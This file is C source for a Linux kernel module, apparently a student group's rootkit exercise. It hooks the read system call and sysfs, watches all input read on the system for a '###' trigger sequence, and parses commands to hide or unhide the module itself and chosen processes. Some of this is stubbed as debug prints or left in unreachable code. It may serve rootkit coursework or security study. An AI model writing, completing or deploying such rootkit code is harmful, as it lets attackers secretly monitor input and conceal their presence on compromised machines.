#include <linux/module.h>    /* Needed by all modules */
#include <linux/kernel.h>    /* Needed for KERN_INFO */
#include <linux/fs.h>
//#include <linux/sched.h>
//#include <linux/list.h>

#include "sysmap.h"          /* Pointers to system functions */
#include "global.h"
#include "hook_read.h"
#include "hide_module.h"

char activate_pattern[] = "###";
int size_of_pattern = sizeof(activate_pattern)-1;
int cur_position = 0;
int last_match = -1;

// stuff for "internal command line"
char internal_cl[2048];

// for convenience, I'm using the following notations for fun pointers:
// fun_<return type>_<arg1>_<arg2>_<arg3>_...
typedef int (*fun_int_void)(void);

static int atoi(char* str){
    int result = 0;
    while (*str){
        result = result * 10 + (*str - '0');
        str++;
    }
    return result;
}

static void handleChar(char c){
    int pr_num;
    if(c=='\n' || c == '\r'){ // confirm command with newline
        if (memcmp(internal_cl, activate_pattern, size_of_pattern)==0){
            OUR_DEBUG("Got command: %s\n", internal_cl+3);
            switch (internal_cl[size_of_pattern]){
                case 'm':
                    OUR_DEBUG("Hiding module\n");
                    break;
                case 'M':
                    OUR_DEBUG("Unhiding module\n");
                    break;
                case 'p':
                    pr_num = atoi(internal_cl+4);
                    OUR_DEBUG("Hiding process nr. %d\n", pr_num);
                    break;
                case 'P':
                    pr_num = atoi(internal_cl+4);
                    OUR_DEBUG("Unhiding process nr. %d\n", pr_num);
                    break;
            }
        }
        memset(internal_cl, 0, size_of_pattern);
        cur_position = 0;
    }
    else {
        internal_cl[cur_position++] = c;
    }
    return;
    if(c=='\n' || c == '\r'){ //cancel command with newline
//        OUR_DEBUG("newline");
        last_match = -1;
        cur_position = 0;
    } else if (last_match == size_of_pattern-1) { //activate pattern matched, read the actual control command
        if(c == 'h'){ //hide
            OUR_DEBUG("HIDE THIS MODULE");
            hide_module();
            last_match = -1;
            cur_position = 0;
        } else if(c == 'u') { //unhide
            OUR_DEBUG("UNHIDE THIS MODULE");
            unhide_module();
            last_match = -1;
            cur_position = 0;
        } else {
            //ignore everything else and wait for a valid command
        }
    } else if(last_match+1 == cur_position){ // activate_pattern matched until last_match, now we compare with last_match + 1
        if(c == activate_pattern[cur_position]) { // match further
//            OUR_DEBUG("match %c", c);
            last_match++;
            cur_position++;
        } else if(c == 127 || c == '\b') { // backspace (why would one want to do this is this case?)
//            OUR_DEBUG("backspace but right");
            if(cur_position != 0){
                last_match--;
                cur_position--;
            }
        } else { // wrong char
//            OUR_DEBUG("no match: %c, expected %c", c, activate_pattern[cur_position]);
            cur_position++;
        }
    } else { // the previous chars don't match, but there might be backspaces and therefore we count the read input up and down
        if(c == 127 || c == '\b'){
//            OUR_DEBUG("backspace wrong");
            if(cur_position != 0){
                cur_position--;
            }
        } else {
//            OUR_DEBUG("wrong char: %c (as int: %d)", c, (int)c);
            cur_position++;
        }
    }
}

static void handle_input(char *buf, int count)
{
    int i;
    for(i = 0; i<count; i++){
        handleChar(buf[i]);
    }
}

/* Initialization routine */
static int __init _init_module(void)
{
    printk(KERN_INFO "This is the kernel module of gruppe 6. %d\n", size_of_pattern);
    memset(internal_cl, 0, size_of_pattern);
    hook_read(handle_input);
    hook_sysfs();

    return 0;
}

/* Exiting routine */
static void __exit _cleanup_module(void)
{
    unhook_read();
    unhide_module();
    unhook_sysfs();
    printk(KERN_INFO "Gruppe 6 says goodbye.\n");
}


/* Declare init and exit routines */
module_init(_init_module);
module_exit(_cleanup_module);
